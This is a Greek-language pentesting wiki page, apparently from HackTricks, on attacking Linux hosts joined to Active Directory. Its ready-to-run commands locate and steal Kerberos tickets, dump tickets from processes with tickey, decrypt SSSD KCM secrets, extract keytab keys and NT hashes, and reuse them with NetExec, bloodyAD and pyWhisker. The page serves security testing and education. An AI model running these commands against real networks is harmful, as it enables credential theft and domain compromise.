# Linux Active Directory

{{#include ../../banners/hacktricks-training.md}}

Ένα linux μηχάνημα μπορεί επίσης να βρίσκεται μέσα σε ένα περιβάλλον Active Directory.

Ένα linux μηχάνημα μέσα σε ένα AD μπορεί να **αποθηκεύει τοπικά υλικό Kerberos**: user ccaches, machine/service keytabs και secrets που διαχειρίζεται το SSSD. Αυτά τα artefacts μπορούν συνήθως να επαναχρησιμοποιηθούν όπως οποιοδήποτε άλλο Kerberos credential. Για να διαβάσετε τα περισσότερα από αυτά, θα πρέπει συνήθως να είστε ο owner του ticket ή **root** στο μηχάνημα.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

## Enumeration

### Enumeration AD από linux

Αν έχετε πρόσβαση σε ένα AD από linux (ή bash στα Windows), μπορείτε να δοκιμάσετε το [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) για να κάνετε enumeration του AD.

Μπορείτε επίσης να ελέγξετε την παρακάτω σελίδα για να μάθετε **άλλους τρόπους enumeration του AD από linux**:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

### FreeIPA

Το FreeIPA είναι μια open-source **εναλλακτική** στο Microsoft Windows **Active Directory**, κυρίως για περιβάλλοντα **Unix**. Συνδυάζει έναν πλήρη **LDAP directory** με ένα MIT **Kerberos** Key Distribution Center για διαχείριση παρόμοια με αυτή του Active Directory. Χρησιμοποιώντας το **Certificate System** του Dogtag για τη διαχείριση CA & RA certificates, υποστηρίζει **multi-factor** authentication, συμπεριλαμβανομένων των smartcards. Το SSSD είναι ενσωματωμένο για διαδικασίες Unix authentication.<sup>[[14]](#references)[[15]](#references)</sup> Μάθετε περισσότερα σχετικά:


{{#ref}}
../software-information/freeipa-pentesting.md
{{#endref}}

### Artefacts host που είναι joined στο domain

Πριν ασχοληθείτε με τα tickets, εντοπίστε **πώς έγινε το join του host στο AD** και **πού αποθηκεύεται πραγματικά το υλικό Kerberos**. Σε σύγχρονους Linux hosts, αυτό συνήθως γίνεται μέσω των `realmd` + `adcli` + `sssd`, όχι μόνο μέσω flat files στο `/tmp`.<sup>[[10]](#references)</sup>
```bash
# Is the host joined to a realm/domain?
realm list 2>/dev/null
adcli testjoin 2>/dev/null

# SSSD / Kerberos configuration
grep -R "ad_domain\|krb5_realm\|cache_credentials\|ldap_id_mapping" /etc/sssd/sssd.conf /etc/sssd/conf.d 2>/dev/null
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null

# Machine account and local Kerberos artefacts
klist -k /etc/krb5.keytab 2>/dev/null
find /var/lib/sss -maxdepth 3 \( -name '*.ldb' -o -name '.secrets.mkey' -o -name 'ccache_*' \) -ls 2>/dev/null
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null
```
Αυτό σας ενημερώνει γρήγορα αν ο host εμπιστεύεται το AD, αν το SSSD αποθηκεύει προσωρινά identities ή tickets και αν είναι διαθέσιμα **machine/service keytabs** ή **KCM secrets** για abuse.<sup>[[4]](#references)[[10]](#references)</sup>

## Ενασχόληση με tickets

### Pass The Ticket

Σε αυτήν τη σελίδα θα βρείτε διαφορετικές τοποθεσίες όπου μπορείτε να **βρείτε kerberos tickets μέσα σε έναν linux host**. Στην επόμενη σελίδα μπορείτε να μάθετε πώς να μετατρέπετε αυτά τα CCache ticket formats σε Kirbi (το format που χρειάζεστε για χρήση στα Windows) και επίσης πώς να πραγματοποιείτε επίθεση PTT:


{{#ref}}
../../windows-hardening/active-directory-methodology/pass-the-ticket.md
{{#endref}}

Αν θέλετε τα **Linux-specific ticket harvesting workflows** (`FILE`, `DIR`, `KEYRING`, `KCM`, `/proc`, κ.λπ.), δείτε την ειδική σελίδα:

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md
{{#endref}}

### Επαναχρησιμοποίηση CCACHE ticket από το /tmp

Τα αρχεία CCACHE είναι binary formats για **αποθήκευση Kerberos credentials**. Το `FILE:/tmp/krb5cc_%{uid}` εξακολουθεί να είναι συνηθισμένο, αλλά τα σύγχρονα Linux deployments χρησιμοποιούν επίσης `DIR:/run/user/%{uid}/krb5cc*`, `KEYRING:persistent:%{uid}` ή `KCM:%{uid}`. Ελέγξτε τη μεταβλητή περιβάλλοντος **`KRB5CCNAME`** και τη ρύθμιση `default_ccache_name` προτού υποθέσετε ότι τα tickets βρίσκονται στο `/tmp`.<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# Where is the current process reading credentials from?
env | grep KRB5CCNAME
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null
klist -l 2>/dev/null

# FILE / DIR caches commonly seen on joined Linux hosts
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null

# Prepare to reuse a FILE cache
export KRB5CCNAME=/tmp/krb5cc_1000
klist
```
### Επαναχρησιμοποίηση CCACHE ticket από keyring

**Τα Kerberos tickets που είναι αποθηκευμένα στη μνήμη μιας διεργασίας μπορούν να εξαχθούν**, ιδιαίτερα όταν η προστασία ptrace του machine είναι απενεργοποιημένη (`/proc/sys/kernel/yama/ptrace_scope`). Ένα χρήσιμο tool για αυτόν τον σκοπό βρίσκεται στη διεύθυνση [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey), το οποίο διευκολύνει την εξαγωγή κάνοντας injection σε sessions και κάνοντας dump των tickets στο `/tmp`.<sup>[[1]](#references)[[16]](#references)</sup>

Για τη ρύθμιση και τη χρήση αυτού του tool, ακολουθούνται τα παρακάτω βήματα:
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```
Αυτή η διαδικασία θα επιχειρήσει να κάνει inject σε διάφορα sessions, υποδεικνύοντας την επιτυχία με την αποθήκευση των extracted tickets στο `/tmp`, χρησιμοποιώντας τη σύμβαση ονοματοδοσίας `__krb_UID.ccache`.<sup>[[1]](#references)</sup>

### Επαναχρησιμοποίηση CCACHE ticket από το SSSD KCM

Το SSSD διατηρεί ένα αντίγραφο της database στη διαδρομή `/var/lib/sss/secrets/secrets.ldb`. Το αντίστοιχο key αποθηκεύεται ως hidden file στη διαδρομή `/var/lib/sss/secrets/.secrets.mkey`. Από προεπιλογή, το key είναι αναγνώσιμο μόνο αν έχετε δικαιώματα **root**.<sup>[[4]](#references)</sup>

Η εκτέλεση του **`SSSDKCMExtractor`** με τις παραμέτρους --database και --key θα αναλύσει τη database και θα **αποκρυπτογραφήσει τα secrets**.<sup>[[4]](#references)</sup>
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
Ο extractor εκτυπώνει raw Kerberos JSON payloads· μετατρέψτε τα σε usable ticket cache ή σε άλλη μορφή ticket πριν από τις λειτουργίες pass-the-cache/pass-the-ticket.<sup>[[4]](#references)</sup>

### Γρήγορο keytab triage
```bash
# Inspect available principals and enctypes
klist -k -e /etc/krb5.keytab

# Request a TGT directly from the keytab
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist
```
### Εξαγωγή λογαριασμών από το /etc/krb5.keytab

Τα κλειδιά λογαριασμών υπηρεσίας, απαραίτητα για υπηρεσίες που λειτουργούν με δικαιώματα root, αποθηκεύονται με ασφάλεια σε αρχεία **`/etc/krb5.keytab`**. Αυτά τα κλειδιά, τα οποία είναι αντίστοιχα με κωδικούς πρόσβασης για υπηρεσίες, απαιτούν αυστηρή εμπιστευτικότητα.<sup>[[5]](#references)</sup>

Για την επιθεώρηση των περιεχομένων του αρχείου keytab, μπορεί να χρησιμοποιηθεί το **`klist`**. Σε Linux, η εντολή `klist -k -K -e` εμφανίζει τα principals, τους αριθμούς έκδοσης κλειδιών, τους τύπους κρυπτογράφησης και το raw key material. Αν ο τύπος κλειδιού είναι **23 / RC4-HMAC**, η τιμή του κλειδιού είναι επίσης το **NT hash** αυτού του principal.<sup>[[6]](#references)[[17]](#references)</sup>
```bash
klist -k -K -e /etc/krb5.keytab
# RC4-HMAC entries expose reusable NTLM material; AES entries do not
```
Για χρήστες Linux, το **`KeyTabExtract`** παρέχει λειτουργικότητα για την εξαγωγή του hash RC4 HMAC, το οποίο μπορεί να αξιοποιηθεί για επαναχρησιμοποίηση hash NTLM. Σημειώστε ότι αυτό βοηθά μόνο όταν το keytab περιέχει ακόμη υλικό **etype 23 / RC4-HMAC**. Σε περιβάλλοντα **AES-only** ενδέχεται να μην μπορείτε να λάβετε ένα επαναχρησιμοποιήσιμο NT hash, αλλά μπορείτε και πάλι να πραγματοποιήσετε άμεσο authentication με το keytab μέσω Kerberos.<sup>[[5]](#references)[[6]](#references)[[7]](#references)</sup>
```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```
Στο macOS, το **`bifrost`** χρησιμεύει ως εργαλείο για την ανάλυση αρχείων keytab.<sup>[[8]](#references)</sup>
```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```
Αξιοποιώντας τις εξαγόμενες πληροφορίες λογαριασμών και hashes, μπορούν να πραγματοποιηθούν συνδέσεις σε servers χρησιμοποιώντας εργαλεία όπως το **`NetExec`**.<sup>[[9]](#references)</sup>
```bash
# NTLM/RC4 material recovered from etype 23 entries
nxc smb 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"

# Or reuse a Kerberos cache directly
KRB5CCNAME=owned.ccache nxc smb <DC_FQDN> --use-kcache
```
### Επαναχρησιμοποίηση του machine account από το `/etc/krb5.keytab`

Σε συστήματα που έχουν γίνει join μέσω `realmd`/`adcli`/`sssd`, το `/etc/krb5.keytab` συνήθως περιέχει το **computer account** και ένα ή περισσότερα **host/service principals**. Αν έχετε **root**, μην κάνετε απλώς dump: χρησιμοποιήστε ένα από τα principals που εμφανίζονται από το `klist -k` για να ζητήσετε ένα TGT και να λειτουργήσετε ως ο ίδιος ο Linux host.<sup>[[10]](#references)</sup>
```bash
# Identify usable principals first
klist -k /etc/krb5.keytab

# Then request a TGT with one of the listed principals
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist

# Validate LDAP / service access using that machine identity
ldapwhoami -Y GSSAPI -H ldap://dc.domain.local
kvno ldap/dc.domain.local
```
Αυτό είναι ιδιαίτερα χρήσιμο όταν το ίδιο το **αντικείμενο υπολογιστή** διαθέτει delegated δικαιώματα στο AD ή όταν ο host επιτρέπεται να ανακτήσει άλλα secrets, όπως ένα **gMSA**.<sup>[[13]](#references)</sup>

### Επαναχρησιμοποίηση κλεμμένου υλικού Kerberos με Linux-first AD εργαλεία

Μόλις αποκτήσετε ένα έγκυρο `ccache` ή ένα usable keytab, μπορείτε να εκτελείτε ενέργειες στο AD **απευθείας από Linux**, χωρίς να μετατρέψετε πρώτα τα πάντα σε Windows formats. Πολλά σύγχρονα εργαλεία υποστηρίζουν εγγενώς τα `KRB5CCNAME` / Kerberos auth.<sup>[[9]](#references)[[11]](#references)[[12]](#references)</sup>
```bash
# Reuse a stolen cache with bloodyAD for LDAP-side actions
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local get object 'CN=Domain Admins,CN=Users,DC=corp,DC=local'

# Reuse the same cache with pyWhisker when you already have write access
KRB5CCNAME=owned.ccache python3 pywhisker.py -d corp.local -k --dc-ip dc.corp.local \
--target 'WEB01$' --action list
```
Αυτό αποτελεί μια καλή γέφυρα μεταξύ του **Linux post-exploitation** και του **AD object abuse**. Για τις ίδιες τις διαδρομές abuse σε επίπεδο object, δείτε:

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.md
{{#endref}}

### Linux gMSA / Managed Service Account artefacts

Οι πρόσφατες αναπτύξεις Linux μπορούν να χρησιμοποιούν **Managed Service Accounts** απευθείας από το AD. Στην πράξη, αυτό σημαίνει ότι, αφού παραβιάσετε έναν Linux server, μπορεί να βρείτε όχι μόνο το host keytab, αλλά και **service-specific keytabs** που δημιουργήθηκαν από ένα gMSA. Συνήθη σημεία προς έλεγχο είναι τα `/etc/gmsad.conf`, τα αρχεία config που αφορούν τη συγκεκριμένη ανάπτυξη και επιπλέον αρχεία `*.keytab` κάτω από το `/etc`.<sup>[[2]](#references)[[13]](#references)</sup>
```bash
# Look for gMSA-related configuration and extra keytabs
grep -R "gMSA_\|principal =\|keytab =" /etc/gmsad.conf /etc/gmsad.d 2>/dev/null
find /etc -maxdepth 2 -name '*.keytab' -ls 2>/dev/null

# Inspect the host keytab and any service keytab you find
klist -kt /etc/krb5.keytab
klist -kt /etc/service.keytab

# If a service/gMSA keytab exists, request a TGT with it
kinit -kt /etc/service.keytab 'svc_web$@DOMAIN.LOCAL'
klist
```
Αυτό σας παρέχει μια επαναχρησιμοποιήσιμη ταυτότητα Kerberos για τα SPNs που είναι συνδεδεμένα με το συγκεκριμένο gMSA **χωρίς να αγγίζει κανένα Windows endpoint**.<sup>[[13]](#references)</sup> Για abuse σε gMSA/dMSA **στην πλευρά του domain** μετά την απόκτηση υψηλότερων privileges στο AD, ελέγξτε:

{{#ref}}
../../windows-hardening/active-directory-methodology/golden-dmsa-gmsa.md
{{#endref}}

## References

- [1] [Kerberos (II): Πώς να επιτεθείτε στο Kerberos;](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [2] [Πρόσβαση στο AD με managed service account – Άμεση ενσωμάτωση συστημάτων RHEL με το Active Directory](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating-rhel-systems-directly-with-active-directory)
- [3] [Μεταβλητές περιβάλλοντος Kerberos – Τεκμηρίωση MIT Kerberos](https://web.mit.edu/Kerberos/krb5-latest/doc/user/user_config/kerberos.html)
- [4] [SSSDKCMExtractor](https://github.com/mandiant/SSSDKCMExtractor)
- [5] [keytab – Τεκμηρίωση MIT Kerberos](https://web.mit.edu/kerberos/krb5-latest/doc/basic/keytab_def.html)
- [6] [RFC 4757: Οι τύποι κρυπτογράφησης RC4-HMAC Kerberos που χρησιμοποιούνται από τα Microsoft Windows](https://www.rfc-editor.org/rfc/rfc4757)
- [7] [KeyTabExtract](https://github.com/sosdave/KeyTabExtract)
- [8] [bifrost](https://github.com/its-a-feature/bifrost)
- [9] [Χρήση Kerberos | NetExec](https://www.netexec.wiki/getting-started/using-kerberos)
- [10] [Εντοπισμός και σύνδεση σε Identity Domains | Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/windows_integration_guide/realmd-domain)
- [11] [Οδηγός χρήσης bloodyAD](https://github.com/CravateRouge/bloodyAD/wiki/User-Guide)
- [12] [pyWhisker](https://github.com/ShutdownRepo/pywhisker)
- [13] [gmsad](https://github.com/cea-sec/gmsad)
- [14] [Σχετικά | Τεκμηρίωση FreeIPA](https://www.freeipa.org/About.html)
- [15] [Σημειώσεις έκδοσης FreeIPA 4.11.0](https://www.freeipa.org/release-notes/4-11-0.html)
- [16] [Yama – Τεκμηρίωση Linux Kernel](https://docs.kernel.org/admin-guide/LSM/Yama.html)
- [17] [klist – Τεκμηρίωση MIT Kerberos](https://web.mit.edu/kerberos/krb5-current/doc/user/user_commands/klist.html)
{{#include ../../banners/hacktricks-training.md}}
